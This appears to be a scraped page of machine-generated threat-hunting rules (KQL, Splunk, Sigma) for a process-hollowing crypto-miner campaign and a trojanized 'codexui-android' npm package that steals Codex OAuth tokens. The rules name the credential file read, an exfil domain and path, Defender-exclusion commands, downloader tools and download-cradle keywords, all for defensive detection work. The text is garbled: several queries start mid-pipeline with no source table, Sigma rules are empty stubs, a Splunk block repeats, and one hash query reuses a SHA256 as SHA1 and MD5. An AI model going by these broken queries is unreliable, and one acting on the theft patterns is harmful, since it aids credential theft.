Targets the campaign's process-hollowing stage: SimpleRunPE.exe (a fork of a public process-hollowing PoC), its renamed copy RuntimeHost.exe, or the masquerading vlc.exe spawning a Microsoft-signed .NET host (InstallUtil/RegAsm/RegSvcs/MSBuild/AppLaunch/AddInProcess/aspnet_compiler) so the miner runs inside a Microsoft-signed shell. The unusual parent makes this article-specific rather than generic .NET-host abuse. Rationale: Microsoft-signed .NET utilities spawned by SimpleRunPE/RuntimeHost (the exact binaries the article names) — plus a vlc.exe parent that isn't in VideoLAN's folder — is a high-fidelity match for the documented process-hollowing chain and would not occur in normal .NET development flows.
ATT&CKT1055.012 T1218.014 T1127.001 T1036.005
Data sourcesEndpoint.Processes
DeviceProcessEvents

[LLM] PowerShell adding RuntimeHost/SimpleRunPE/vlc paths to Defender exclusions Installation High
Catches the campaign's anti-AV step: a PowerShell session calling Add-MpPreference to whitelist the malware's executable path and process name from Defender scanning, immediately before/around the process-hollowing stage. Article-specifically scoped to ExclusionPath/ExclusionProcess values that name the campaign's binaries or hidden user-profile folders. Rationale: Add-MpPreference exclusion for a campaign-named binary (RuntimeHost/SimpleRunPE/gminer/lolMiner/SRBMiner) or for AppData paths is a deliberate AV-evasion combo. Article explicitly states the malware invokes PowerShell to add its path/process to Defender's exclusion list.

DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("powershell.exe","pwsh.exe","powershell_ise.exe")
| where ProcessCommandLine has_any ("Add-MpPreference","Set-MpPreference")
| where ProcessCommandLine has_any ("ExclusionPath","ExclusionProcess","ExclusionExtension")
| extend CampaignHit = iif(ProcessCommandLine has_any ("RuntimeHost","SimpleRunPE","vlc.exe","gminer","lolMiner","SRBMiner",@"\AppData\Roaming\",@"\AppData\Local\"), "likely", "review")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, CampaignHit
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 4688
| where NewProcessName endswith @"\powershell.exe" or NewProcessName endswith @"\pwsh.exe"
| where CommandLine has_any ("Add-MpPreference","Set-MpPreference")
| where CommandLine has_any ("ExclusionPath","ExclusionProcess","ExclusionExtension")
| extend CampaignHit = iif(CommandLine has_any ("RuntimeHost","SimpleRunPE","vlc.exe","gminer","lolMiner","SRBMiner",@"\AppData\"), "likely", "review")

[LLM] RuntimeHost.exe / vlc.exe writing six autostart entries from AppData (six-mechanism persistence) Installation High
Detects the campaign's distinctive persistence step where RuntimeHost.exe (or its vlc.exe-impersonating copy) writes to multiple Windows autostart locations — Run/RunOnce keys, Schtasks, Startup-folder shortcuts, WMI subscriptions, Image File Execution Options, services — within a short window from a single host. Article reports exactly six mechanisms which is the threshold pivot. Rationale: Article explicitly says the binary establishes six persistence mechanisms across multiple autostart locations — threshold of >=3 distinct autostart targets from one of the named processes within 30 min is a near-perfect article-specific pivot.
ATT&CKT1547.001 T1053.005 T1546.003 T1036.005
Data sourcesEndpoint.Registry
let RunKeyPatterns = dynamic([@"\CurrentVersion\Run", @"\CurrentVersion\RunOnce", @"\Image File Execution Options\", @"\CurrentVersion\Winlogon", @"\Services\"]);
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has_any (RunKeyPatterns)
   or RegistryValueData has_any ("RuntimeHost.exe","SimpleRunPE.exe")
| where InitiatingProcessFileName in~ ("RuntimeHost.exe","SimpleRunPE.exe","vlc.exe")
   or InitiatingProcessFolderPath has @"\AppData\"
| summarize PersistenceCount=dcount(RegistryKey), Keys=make_set(RegistryKey,10), Values=make_set(RegistryValueData,10) by DeviceName, InitiatingProcessFileName, bin(Timestamp,30m)
| where PersistenceCount >= 3
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where EventType =~ "RegistryValueSet" or EventType =~ "RegistryKeyCreated"

| where ActingProcessName has_any (@"\RuntimeHost.exe", @"\SimpleRunPE.exe", @"\vlc.exe")
   or ActingProcessCommandLine has @"\AppData\"
| summarize PersistenceCount=dcount(RegistryKey), Keys=make_set(RegistryKey,10), Values=make_set(RegistryValueData,10) by DvcHostname, ActingProcessName, bin(TimeGenerated,30m)
| where PersistenceCount >= 3

[LLM] GPU miner binaries gminer / lolMiner / SRBMiner-MULTI launched on endpoint Actions on Objectives High
Catches the campaign's monetisation endgame: execution of one of the three named GPU miners (gminer, lolMiner, SRBMiner-MULTI) regardless of process name (since the binary may be renamed/hollowed), via either filename, embedded version strings, or characteristic mining-pool command-line flags (--algo / --pool / -k / --kawpow / etheash / ergo etc.). Pair with parent = a Microsoft-signed .NET host to confirm the campaign chain. Rationale: Article names the three exact miner families (gminer, lolMiner, SRBMiner-MULTI). Combining filename detection with command-line flags catches renamed copies executed via process-hollowing into Microsoft .NET hosts.

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats summariesonly=false count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]

status: experimental
description: |

    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867") or SHA1 in~ ("ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867") or MD5 in~ ("ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867") or SHA1 in~ ("ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867") or MD5 in~ ("ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["ebc35d4a08d93a880e90aead2d3f7fb43fdc08ea77db9dd52f80781e6bfd8867"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint · [LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) · [LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
[LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) Command & Control High
Hunts DNS resolution or outbound HTTPS to the attacker C2 anyclaw.store / sentry.anyclaw.store used by the trojanized codexui-android npm package and its companion Play Store apps to POST stolen Codex auth.json blobs to /startlog. Endpoint is deliberately named to blend with legitimate Sentry telemetry. Rationale: Domain sentry.anyclaw.store + path /startlog + User-Agent codexui/<ver> are unique strings from the article's exfil function. No legitimate use of anyclaw.store exists. Cross-checked: domain pattern matches Aikido's IOC publication and anyclaw.store appears as the only C2 host across both npm package and Android APK chains in the article. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1071.001 T1036.005 T1567

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
| order by Timestamp desc
union isfuzzy=true

| order by TimeGenerated desc

[LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint Delivery High
Hunts the installation vector for the supply-chain attack - npm or pnpm pulling codexui-android (any version >= 0.1.82) onto a developer workstation or CI runner. The published npm artifact contains the malicious chunk-PUR7OUAG.js that the GitHub source does not. Rationale: `codexui-android` is the literal article-specific package name; chunk-PUR7OUAG.js is the unique malicious entry-point chunk only present in the npm artifact (never committed to GitHub). Either string in a node-tooling command line on a developer host is high-fidelity for this supply-chain attack. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1195.002 T1059.007

| order by Timestamp desc

[LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) Actions on Objectives High
Hunts the credential-access primitive of the codexui-android malware - a node process whose module path lives under codexui-android/dist-cli/ opening the Codex OAuth token store at ~/.codex/auth.json or $CODEX_HOME/auth.json. This catches the file-read step regardless of whether C2 succeeds. Rationale: The article's exfil function explicitly resolves $CODEX_HOME/auth.json and reads the whole file. Filename auth.json + parent dir .codex + reader process node (or anything in a codexui-android path) is a tight, article-specific triple. Filtering on InitiatingProcessFolderPath containing codexui-android removes legitimate Codex CLI use. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, FolderPath, FileName, ActionType

[LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) Actions on Objectives High
Hunts the exact exfil request shape - HTTPS POST to path /startlog with User-Agent matching ^codexui/<version>. Catches the malware even if the C2 domain is changed but URL/UA conventions remain. Targets proxy/firewall layer-7 telemetry. Rationale: Path /startlog and User-Agent prefix codexui/ are hard-coded in the article's httpsRequest options block. The UA prefix in particular is a self-identifying string the attacker chose - no legitimate Sentry SDK or anything else uses it. Catches mirror domains / IP fallbacks if the attacker rotates infrastructure. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
union isfuzzy=true
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where RequestMethod =~ "POST"
    | where RequestURL has "/startlog" or DestinationHostName endswith "anyclaw.store" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, RequestMethod, RequestURL, DestinationHostName, UserAgent=RequestClientApplication, DeviceVendor, DeviceProduct),
  (ImWebSession
    | where TimeGenerated > ago(30d)
    | where HttpMethod =~ "POST"
    | where Url has "/startlog" or HttpHostName endswith "anyclaw.store" or HttpRequestHeaderUserAgent startswith "codexui/"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, RequestMethod=HttpMethod, RequestURL=Url, DestinationHostName=HttpHostName, UserAgent=HttpRequestHeaderUserAgent, DeviceVendor=EventVendor, DeviceProduct=EventProduct),

    | project TimeGenerated, Computer, ClientIP=cIP, RequestMethod=csMethod, RequestURL=csUriStem, DestinationHostName=sSiteName, UserAgent=csUserAgent, DeviceVendor="Microsoft", DeviceProduct="IIS")
| order by TimeGenerated desc

[LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer) Delivery Medium
Hunts the mobile delivery vector - Play Store installs of the BrutalStrike author's apps that bootstrap the malicious codexui-android npm package inside a PRoot Linux userland. Both APKs share the app.anyclaw.* Kotlin namespace and register the anyclaw://auth/codex-callback URI scheme. Rationale: Article-specific package IDs gptos.intelligence.assistant and codex.app are named explicitly as the two Play Store apps that bootstrap the malicious codexui-android npm package on first launch. Kotlin namespace app.anyclaw.* and URI scheme anyclaw://auth/codex-callback are shared signatures across both APKs and are not used by any legitimate app. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1474.003 T1456
Data sourcesEndpoint.Application_State
DeviceInfo
| where Timestamp > ago(30d)
| where OSPlatform startswith "Android"
| join kind=inner (
    DeviceTvmSoftwareInventory
    | where SoftwareName in~ ("gptos.intelligence.assistant","codex.app","OpenClaw Codex Claude AI Agent","Codex")
         or SoftwareVendor has "anyclaw"
  ) on DeviceId
| project Timestamp, DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion
| order by Timestamp desc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(30d)
| where OSPlatform startswith "Android"
| where SoftwareName in~ ("gptos.intelligence.assistant","codex.app","OpenClaw Codex Claude AI Agent","Codex")
| project TimeGenerated, DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion
| order by TimeGenerated desc
@mobile.app.package_name:(gptos.intelligence.assistant OR codex.app) OR @mobile.app.namespace:app.anyclaw.* OR @mobile.app.intent_filter.scheme:anyclaw
NETWORK
index=mdm OR index=intune (app_package_name="gptos.intelligence.assistant" OR app_package_name="codex.app" OR app_package="app.anyclaw.*" OR app_bundle_id="gptos.intelligence.assistant" OR app_bundle_id="codex.app") | stats earliest(_time) as firstSeen latest(_time) as lastSeen values(device_name) as device values(user) as user values(app_version) as version by app_package_name | convert ctime(firstSeen) ctime(lastSeen)

title: Crypto-Wallet Keystore Access by Non-Wallet Process
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d02
status: experimental
description: |

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores

OAuth consent / suspicious app grant Actions on Objectives High

ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc
